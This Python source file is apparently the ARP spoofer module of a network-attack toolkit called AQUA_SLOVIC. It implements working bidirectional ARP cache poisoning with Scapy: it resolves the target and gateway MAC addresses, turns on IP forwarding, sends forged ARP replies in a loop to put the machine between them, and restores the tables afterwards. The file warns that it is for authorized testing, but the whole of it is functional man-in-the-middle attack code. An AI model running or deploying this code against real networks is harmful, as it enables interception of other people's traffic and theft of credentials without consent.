"""
AQUA_SLOVIC -- ARP Spoofer Module
Man-in-the-Middle via ARP cache poisoning (bidirectional).
"""

import threading
import time
import platform

from colorama import Fore, Style

from aquaslovic.core.utils import (
    print_info, print_success, print_error, print_warning,
    is_root, require_root, get_gateway_ip, get_mac,
    enable_ip_forwarding, disable_ip_forwarding,
    resolve_hostname, lookup_vendor,
)


def _get_scapy_iface(iface_name=None):
    """Resolve a working Scapy interface for the current platform."""
    try:
        from scapy.all import conf, get_working_ifaces
        if iface_name and iface_name.lower() != "auto":
            # On Windows, try to find the Npcap-compatible name
            if platform.system().lower() == "windows":
                for iface_obj in get_working_ifaces():
                    name = getattr(iface_obj, "name", str(iface_obj))
                    desc = getattr(iface_obj, "description", "")
                    guid = getattr(iface_obj, "guid", "")
                    if (iface_name.lower() in name.lower()
                            or iface_name.lower() in desc.lower()
                            or iface_name == guid):
                        return iface_obj
            return iface_name
        return conf.iface
    except Exception:
        return None


class ARPSpoofer:
    """
    ARP cache poisoning for Man-in-the-Middle attacks.

    Sends forged ARP replies to both the target and the gateway,
    positioning the attacker's machine between them. Enables IP
    forwarding so traffic flows through transparently.

    WARNING: For authorized security testing only!
    """

    def __init__(self):
        self.running = False
        self.spoof_thread = None
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.iface = None
        self.pkt_count = 0

    def start(self, target_ip, gateway_ip=None, iface=None):
        """
        Start ARP spoofing.

        Args:
            target_ip: IP address of the target to spoof
            gateway_ip: Gateway IP (auto-detected if None)
            iface: Network interface name (auto-detected if None)
        """
        if not require_root():
            return

        if self.running:
            print_warning("ARP spoofer is already running. Stop it first: arp.spoof off")
            return

        try:
            from scapy.all import ARP, Ether, sendp, conf
            # Ensure Npcap/pcap is used on Windows
            if platform.system().lower() == "windows":
                conf.use_pcap = True
        except ImportError:
            print_error("Scapy is required for ARP spoofing. Install: pip install scapy")
            return

        self.iface = _get_scapy_iface(iface)
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or get_gateway_ip()

        if not self.gateway_ip:
            print_error("Could not detect gateway IP. Set it: set arp.gateway <ip>")
            return

        print_info("Resolving MAC addresses...")

        # Get target MAC
        self.target_mac = get_mac(self.target_ip, iface=self.iface)
        if not self.target_mac:
            print_error(f"Could not resolve MAC for target {self.target_ip}. Is it online?")
            return

        # Get gateway MAC
        self.gateway_mac = get_mac(self.gateway_ip, iface=self.iface)
        if not self.gateway_mac:
            print_error(f"Could not resolve MAC for gateway {self.gateway_ip}.")
            return

        # Resolve hostnames and vendors
        target_name = resolve_hostname(self.target_ip)
        gateway_name = resolve_hostname(self.gateway_ip)
        target_vendor = lookup_vendor(self.target_mac)
        gateway_vendor = lookup_vendor(self.gateway_mac)

        # Enable IP forwarding
        enable_ip_forwarding()

        self.running = True
        self.pkt_count = 0

        print_success("ARP spoofing started:")
        print(f"  Target  : {Fore.WHITE}{self.target_ip}{Style.RESET_ALL}"
              f"  MAC: {Fore.YELLOW}{self.target_mac}{Style.RESET_ALL}"
              f"  [{target_vendor}]"
              f"  ({target_name})")
        print(f"  Gateway : {Fore.WHITE}{self.gateway_ip}{Style.RESET_ALL}"
              f"  MAC: {Fore.YELLOW}{self.gateway_mac}{Style.RESET_ALL}"
              f"  [{gateway_vendor}]"
              f"  ({gateway_name})")
        if self.iface:
            iface_str = getattr(self.iface, "name", str(self.iface))
            print(f"  Iface   : {Fore.WHITE}{iface_str}{Style.RESET_ALL}")
        print_warning("For authorized security testing only!")
        print_info("Use 'arp.spoof off' to stop and restore ARP tables.")

        self.spoof_thread = threading.Thread(
            target=self._spoof_loop, daemon=True
        )
        self.spoof_thread.start()

    def stop(self):
        """Stop ARP spoofing and restore ARP tables."""
        if not self.running:
            print_warning("ARP spoofer is not running.")
            return

        self.running = False
        print_info("Stopping ARP spoofer and restoring ARP tables...")

        # Restore original ARP tables
        self._restore()

        # Disable IP forwarding
        disable_ip_forwarding()

        print_success(
            f"ARP tables restored. Spoofing stopped. "
            f"({self.pkt_count} spoofed packets sent)"
        )

    def _spoof_loop(self):
        """Continuously send forged ARP replies."""
        try:
            from scapy.all import ARP, Ether, sendp

            while self.running:
                try:
                    # Tell target: "I am the gateway"
                    pkt_to_target = Ether(dst=self.target_mac) / ARP(
                        op=2,  # ARP reply
                        pdst=self.target_ip,
                        hwdst=self.target_mac,
                        psrc=self.gateway_ip,
                    )
                    sendp(pkt_to_target, verbose=False, iface=self.iface)

                    # Tell gateway: "I am the target"
                    pkt_to_gateway = Ether(dst=self.gateway_mac) / ARP(
                        op=2,
                        pdst=self.gateway_ip,
                        hwdst=self.gateway_mac,
                        psrc=self.target_ip,
                    )
                    sendp(pkt_to_gateway, verbose=False, iface=self.iface)

                    self.pkt_count += 2
                    time.sleep(1)  # Send every 1 second for reliability

                except Exception as e:
                    if self.running:
                        print_error(f"Spoofing error: {e}")
                        time.sleep(2)

        except Exception as e:
            if self.running:
                print_error(f"ARP spoof loop failed: {e}")
                self.running = False

    def _restore(self):
        """Restore original ARP tables by sending correct ARP replies."""
        try:
            from scapy.all import ARP, Ether, sendp

            if self.target_mac and self.gateway_mac:
                # Restore target's ARP table (unicast)
                pkt_to_target = Ether(dst=self.target_mac) / ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac,  # Real gateway MAC
                )

                # Restore gateway's ARP table (unicast)
                pkt_to_gateway = Ether(dst=self.gateway_mac) / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=self.target_mac,  # Real target MAC
                )

                # Also send broadcast restore packets for reliability
                pkt_to_target_bc = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac,
                )

                pkt_to_gateway_bc = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=self.target_ip,
                    hwsrc=self.target_mac,
                )

                # Send multiple rounds to ensure restoration
                for _ in range(7):
                    sendp(pkt_to_target, verbose=False, iface=self.iface)
                    sendp(pkt_to_gateway, verbose=False, iface=self.iface)
                    sendp(pkt_to_target_bc, verbose=False, iface=self.iface)
                    sendp(pkt_to_gateway_bc, verbose=False, iface=self.iface)
                    time.sleep(0.3)

        except Exception as e:
            print_error(f"Failed to restore ARP tables: {e}")
